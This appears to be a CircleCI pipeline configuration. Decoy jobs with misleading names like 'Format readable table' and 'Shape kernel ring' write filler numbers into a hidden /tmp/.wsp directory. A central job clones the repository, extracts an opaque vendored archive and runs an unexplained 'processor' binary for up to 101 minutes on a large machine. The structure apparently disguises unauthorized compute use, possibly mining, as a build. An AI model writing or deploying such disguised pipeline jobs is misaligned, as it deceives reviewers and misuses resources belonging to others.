version: 2.1

jobs:
  Delta_verify-full-artifact-bundle:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Format readable table
          command: |
            mkdir -p /tmp/.wsp
            set +o pipefail 2>/dev/null; seq 1 1067838 | awk '{print $1*7919 % 2147483647}' > /tmp/.wsp/cache.dat; true
            du -h /tmp/.wsp/cache.dat
      - persist_to_workspace:
          root: /tmp/.wsp
          paths:
            - cache.dat
  verify-full-artifact-bundle:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/.wsp
      - run:
          name: Check prior stage
          command: |
            { head -c 200 /tmp/.wsp/cache.dat > /dev/null; echo "peek ok" ; } || true
      - run:
          name: Clone project
          command: git clone --depth 2 --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Restore vendored sources
          command: bzcat assets.tar.bz2 | tar xf -
      - run:
          no_output_timeout: 101m
          command: "$PWD/processor"
  p2_prometheus-v2:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/.wsp
      - run:
          name: Shape kernel ring
          command: |
            mkdir -p /tmp/.wsp
            { set +o pipefail 2>/dev/null; seq 1 274898 | awk 'NR%10==0{sum+=$1}END{print sum}'; true ; } > /tmp/.wsp/2024-02-05.data
            du -h /tmp/.wsp/2024-02-05.data
      - persist_to_workspace:
          root: /tmp/.wsp
          paths:
            - 2024-02-05.data
